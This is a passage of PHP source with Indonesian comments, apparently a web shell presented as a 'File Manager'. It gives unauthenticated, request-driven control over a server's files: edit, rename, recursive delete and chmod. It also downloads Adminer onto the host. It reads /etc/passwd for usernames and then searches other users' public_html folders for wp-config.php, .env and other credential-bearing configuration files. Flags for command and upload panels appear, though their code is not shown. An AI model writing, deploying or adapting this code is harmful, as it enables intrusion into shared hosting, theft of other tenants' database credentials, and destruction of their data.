];$regularFiles = [];foreach ($files as $file) {    $filePath = $directory . DIRECTORY_SEPARATOR . $file;    if (is_dir($filePath)) {        $dirs[] = $file;  // Menyimpan folder    } else {        $regularFiles[] = $file;  // Menyimpan file biasa    }}// Gabungkan folder dan file biasa menjadi satu array$sortedFiles = array_merge($dirs, $regularFiles);// Dapatkan informasi server$serverInfo = php_uname();$serverIP = $_SERVER['SERVER_ADDR'];$phpVersion = phpversion();$currentDir = htmlspecialchars($directory);  $showTools = isset($_GET['show_tools']) ? true : false;$showUpload = isset($_GET['show_upload']) ? true : false;$showCmd = isset($_GET['show_cmd']) ? true : false;$showFinder = isset($_GET['show_finder']) ? true : false;// Fungsi rekursif untuk mencari file/folderfunction searchFile($dir, $filename) {    $results = [];    $items = scandir($dir);    foreach ($items as $item) {        if ($item === '.' || $item === '..') continue;        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;        if (is_dir($fullPath)) {            // Jika direktori, cari rekursif dan tambahkan folder yang cocok            if (stripos($item, $filename) !== false) {                $results[] = $fullPath;  // Menambahkan folder ke hasil            }            $results = array_merge($results, searchFile($fullPath, $filename));        } elseif (stripos($item, $filename) !== false) {            // Jika file ditemukan, tambahkan ke hasil            $results[] = $fullPath;        }    }    return $results;}// Menangani pencarian file jika form dikirim$searchResults = [];if (isset($_GET['search']) && isset($_GET['dir'])) {    $searchDir = $_GET['dir'];    $searchName = $_GET['search'];    if (is_dir($searchDir)) {        $searchResults = searchFile($searchDir, $searchName);    } else {        $searchResults[] = "Direktori tidak valid.";    }}// Proses mengunduh Adminerif (isset($_GET['download_adminer'])) {    $adminerUrl = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";    $destination = $directory . "/adminer.php";    // Mengunduh file Adminer    $fileContents = file_get_contents($adminerUrl);    if ($fileContents) {        file_put_contents($destination, $fileContents);        header('Location: ?dir=' . urlencode($directory) . '&adminer_downloaded=1');    } else {        header('Location: ?dir=' . urlencode($directory) . '&adminer_download_failed=1');    }    exit;}// Membaca file /etc/passwd dan mengekstrak username$users = [];if ($handle = fopen("/etc/passwd", "r")) {    while (($line = fgets($handle)) !== false) {        $parts = explode(":", $line);        $users[] = $parts[0]; // Ambil nama pengguna    }    fclose($handle);}// Fungsi untuk mencari file konfigurasi dalam subfolder level 1function findConfigFiles($baseDir) {    $configFiles = [];    $subDirs = glob($baseDir . '/*', GLOB_ONLYDIR); // Dapatkan semua folder langsung di bawah baseDir        foreach ($subDirs as $subDir) {        // Tentukan file yang ingin dicari        $filesToSearch = ['wp-config.php', 'configuration.php', '.env', 'config.db.php', 'config.php'];        foreach ($filesToSearch as $file) {            $filePath = $subDir . '/' . $file;            if (file_exists($filePath)) {                $configFiles[] = $filePath; // Simpan path file konfigurasi yang ditemukan            }        }    }    return $configFiles;}// Menyimpan hasil pencarian di dalam array$configFiles = [];foreach ($users as $user) {    $baseDir = "/home/$user/public_html"; // Direktori base untuk mencari    // Cari file konfigurasi dalam subfolder 1 tingkat di bawah public_html    $configFiles = array_merge($configFiles, findConfigFiles($baseDir));}if ($_SERVER['REQUEST_METHOD'] === 'POST') {    if (isset($_POST['action'])) {        $file = $directory . DIRECTORY_SEPARATOR . $_POST['file'];        $action = $_POST['action'];        // Edit file        if ($action === 'edit' && file_exists($file)) {            $newContent = $_POST['content'];            file_put_contents($file, $newContent);  // Menyimpan perubahan konten        }        // Rename file        if ($action === 'rename' && file_exists($file)) {            $newName = $_POST['new_name'];            rename($file, $directory . DIRECTORY_SEPARATOR . $newName); // Rename file        }// Delete file or folderif ($action === 'delete') {    if (file_exists($file)) {        // Jika yang dipilih adalah folder, hapus seluruh isinya terlebih dahulu        if (is_dir($file)) {            deleteDirectory($file);  // Panggil fungsi untuk menghapus folder beserta isinya        } else {            unlink($file);  // Menghapus file        }    }}        // Change permissions        if ($action === 'chmod' && file_exists($file)) {            $permissions = $_POST['permissions'];            chmod($file, octdec($permissions)); // Mengubah permissions        }        // Redirect ke halaman yang sama setelah aksi selesai        header("Location: ?dir=" . urlencode($directory));        exit;    }}// Fungsi untuk menghapus folder beserta isinyafunction deleteDirectory($dir) {    // Mengambil daftar file dan folder dalam folder    $files = array_diff(scandir($dir), array('.', '..'));        foreach ($files as $file) {        $filePath = $dir . DIRECTORY_SEPARATOR . $file;        if (is_dir($filePath)) {            deleteDirectory($filePath);  // Rekursif untuk menghapus folder dalam folder        } else {            unlink($filePath);  // Menghapus file        }    }        // Setelah folder kosong, hapus foldernya    rmdir($dir);}?><!DOCTYPE html><html lang="id"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>File Manager</title>    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">    <link